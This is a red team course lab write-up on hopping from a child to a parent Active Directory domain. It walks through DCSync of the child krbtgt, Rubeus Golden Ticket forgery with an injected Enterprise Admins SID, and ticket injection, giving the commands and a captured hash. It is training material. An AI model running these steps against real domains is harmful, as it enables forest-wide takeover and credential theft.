# CRTO — Domain Trusts: Parent-Child Trust Hop

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Parent-Child Trusts
**Objective:** Hop from a child domain (dublin.contoso.com) to its parent (contoso.com) by forging a Golden Ticket with SID history to impersonate an Enterprise Admin

---

## The Full Chain

```
ldapsearch → enumerate trust relationship (bidirectional, within-forest)
    ↓
Collect child domain SID (S-1-5-21-690277740-...) 
Collect parent Enterprise Admins SID (S-1-5-21-3926355307-...-519)
    ↓
Impersonate sguest (child domain DA) → dcsync dublin.contoso.com DUBLIN\krbtgt
    ↓
Forge Golden Ticket for child domain with /sids = parent Enterprise Admins SID
    ↓
kerberos_ticket_use → inject Golden Ticket into Beacon session
    ↓
ls \\lon-dc-1\c$ → access parent DC as Enterprise Admin
```

---

## Background — Why Parent-Child Trusts Are Exploitable

In an AD forest, parent and child domains automatically establish a **bidirectional transitive trust** (`TRUST_DIRECTION_BIDIRECTIONAL`, `TRUST_ATTRIBUTE_WITHIN_FOREST`). This means:

- Users in the child domain can authenticate to resources in the parent domain
- Users in the parent domain can authenticate to resources in the child domain

The attack abuses **SID history** — a field in the Kerberos PAC that allows a migrated user's old SIDs to be preserved for resource access. When a Golden Ticket is forged with an extra SID (`/sids`) pointing to the parent's **Enterprise Admins group**, the parent DC sees the ticket and grants Enterprise Admin-level access.

> **Key insight:** Compromising a child domain's krbtgt hash gives you the ability to forge tickets that the parent DC will honour — because the forest trust means the parent DC trusts tickets signed by the child's krbtgt. Adding the Enterprise Admins SID to the ticket's SID history is what escalates you to forest-wide admin.

---

## Step 1 — Enumerate the Trust

```bash
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```

**Key attribute values:**

| Attribute | Value | Meaning |
|---|---|---|
| `trustDirection` | `3` | `TRUST_DIRECTION_BIDIRECTIONAL` — both domains trust each other |
| `trustAttributes` | `32` | `TRUST_ATTRIBUTE_WITHIN_FOREST` — same forest, transitive trust |
| `trustPartner` | `contoso.com` | The trusted partner (parent domain) |
| `flatName` | `CONTOSO` | NetBIOS name of parent |

> `TRUST_ATTRIBUTE_WITHIN_FOREST` is the critical flag — within-forest trusts are fully transitive and SID history is honoured. Cross-forest trusts (`TRUST_ATTRIBUTE_FOREST_TRANSITIVE`) have SID filtering enabled by default, which blocks the SID history attack.

**TTP:** T1482 — Domain Trust Discovery

---

## Step 2 — Collect Required SIDs

### Child Domain SID

```bash
ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
```

> Result: `S-1-5-21-690277740-3036021016-2883941857`

This is the **domain SID** of the child domain — used as the `/sid` parameter in the Golden Ticket.

### Parent Enterprise Admins SID

```bash
ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
```

> Result: `S-1-5-21-3926355307-1661546229-813047887-519`

This is the SID of the **Enterprise Admins group** in the parent domain. RID `519` is always Enterprise Admins. This goes in `/sids` — the SID history field.

**Why Enterprise Admins (RID 519):**
- Enterprise Admins is the highest-privileged group in an AD forest
- It has admin rights across all domains in the forest by default
- Adding this SID to the ticket's SID history grants forest-wide admin access

---

## Step 3 — Credential Access: DCSync Child Domain krbtgt

```bash
# Impersonate sguest (Domain Admin in dublin.contoso.com)
steal_token [sguest_pid]    # or make_token DUBLIN\sguest [password]

# DCSync the child domain's krbtgt
dcsync dublin.contoso.com DUBLIN\krbtgt
```

**Capture from output:**
```
aes256_hmac : 2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
```

> Always use AES256 for ticket forgery — RC4 is more detectable.

---

## Step 4 — Forge Golden Ticket with SID History

Run on the attacker desktop (fully offline — no Beacon required):

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden `
  /user:Administrator `
  /domain:dublin.contoso.com `
  /sid:S-1-5-21-690277740-3036021016-2883941857 `
  /sids:S-1-5-21-3926355307-1661546229-813047887-519 `
  /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 `
  /outfile:C:\Users\Attacker\Desktop\golden
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `/user` | `Administrator` | Username to impersonate in the ticket |
| `/domain` | `dublin.contoso.com` | Child domain — the ticket is issued for this domain |
| `/sid` | Child domain SID | The domain SID for the child — ticket's issuing domain |
| `/sids` | Parent Enterprise Admins SID | **SID history injection** — grants EA privileges in parent |
| `/aes256` | Child krbtgt AES256 | Signing key — child's krbtgt hash |
| `/outfile` | Path prefix | Saves ticket as `.kirbi` file (Rubeus appends `.kirbi`) |

**The `/sids` parameter is the key to this attack:**
```
Normal Golden Ticket:  forged TGT for Administrator@dublin.contoso.com
                       → gives DA in child domain only

With /sids (EA SID):   forged TGT for Administrator@dublin.contoso.com
                       + SID history: S-1-5-21-...-519 (Enterprise Admins)
                       → when parent DC processes ticket, it sees EA membership
                       → grants Enterprise Admin access across the entire forest
```

---

## Step 5 — Inject Ticket and Access Parent DC

```bash
# Inject the forged golden ticket into the current Beacon session
# (replaces the current TGT for sguest)
kerberos_ticket_use C:\Users\Attacker\Desktop\golden.kirbi

# Verify
run klist
# Should show: Client: Administrator @ DUBLIN.CONTOSO.COM
#              Server: krbtgt/DUBLIN.CONTOSO.COM

# Access parent domain controller
ls \\lon-dc-1\c$
```

> Successful `ls \\lon-dc-1\c$` confirms forest-wide Enterprise Admin access. From here: DCSync contoso.com for all parent domain hashes, Golden Ticket for contoso.com, full forest compromise.

---

## What Happens at the Trust Boundary

```
Beacon presents Golden Ticket (child domain TGT + EA SID in SID history)
    ↓
Request crosses trust boundary to contoso.com (lon-dc-1)
    ↓
lon-dc-1 KDC decrypts the inter-realm ticket using the trust key
    ↓
KDC reads PAC — sees Administrator@dublin.contoso.com
    ↓
KDC also reads SID history — sees S-1-5-21-...-519 (Enterprise Admins)
    ↓
KDC issues a service ticket (TGS) for CIFS/lon-dc-1 granting EA-level access
    ↓
lon-dc-1 SMB service accepts — grants access as Enterprise Admin
```

---

## SID Filtering — Why This Works Within Forest But Not Cross-Forest

| Trust Type | SID Filtering | SID History Attack |
|---|---|---|
| Within-forest (`TRUST_ATTRIBUTE_WITHIN_FOREST`) | **Disabled by default** | ✅ Works — EA SID in history is honoured |
| Cross-forest (`TRUST_ATTRIBUTE_FOREST_TRANSITIVE`) | **Enabled by default** | ❌ Blocked — foreign SIDs stripped from PAC |
| Cross-forest with SID filtering disabled | Disabled (misconfigured) | ✅ Works |

> SID filtering (`quarantine` flag) strips SIDs from foreign domains out of the PAC before the ticket is processed. Within-forest trusts don't apply filtering because all domains are assumed to be under the same administrative control — which is exactly what this attack exploits.

---

## Parent-Child vs Other Trust Hops

| Scenario | Method | Key Requirement |
|---|---|---|
| Child → Parent (this lab) | Golden Ticket + `/sids` EA SID | Child domain krbtgt AES256 |
| Parent → Child | Parent DA already has child DA implicitly | Standard DA access |
| Cross-forest (inbound) | Requires SID filtering bypass or other technique | Much harder |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1482 | Domain Trust Discovery | ldapsearch trust enumeration |
| T1003.006 | DCSync | Extract child krbtgt AES256 hash |
| T1558.001 | Golden Ticket | Forge child domain TGT with EA SID history |
| T1134.005 | Token Impersonation: SID-History Injection | `/sids` adds EA SID to PAC |
| T1078.002 | Valid Accounts: Domain Accounts | Authenticate to parent DC as Enterprise Admin |

---

## Key Takeaways

- `trustAttributes=32` (`TRUST_ATTRIBUTE_WITHIN_FOREST`) = SID filtering disabled = SID history attack works
- `trustDirection=3` = bidirectional — both domains trust each other, cross-domain ticket exchange works in both directions
- The `/sids` flag in Rubeus `golden` is the entire mechanism — it injects the Enterprise Admins SID into the ticket's SID history field
- `/domain` must be the **child domain** — the ticket is signed by the child's krbtgt, so it must be issued for the child domain
- `/sid` = child domain SID (no RID), `/sids` = parent Enterprise Admins SID (full SID including RID 519)
- Enterprise Admins RID is always `519` — the full SID is `<parent domain SID>-519`
- `kerberos_ticket_use` replaces the current TGT in the session — use on a Beacon that's already impersonating a child DA (sguest)
- After crossing to the parent: DCSync `contoso.com` immediately — extract parent krbtgt + all hashes for full forest persistence
- Cross-forest trusts have SID filtering enabled by default — this exact technique does not work against external forests without additional misconfiguration
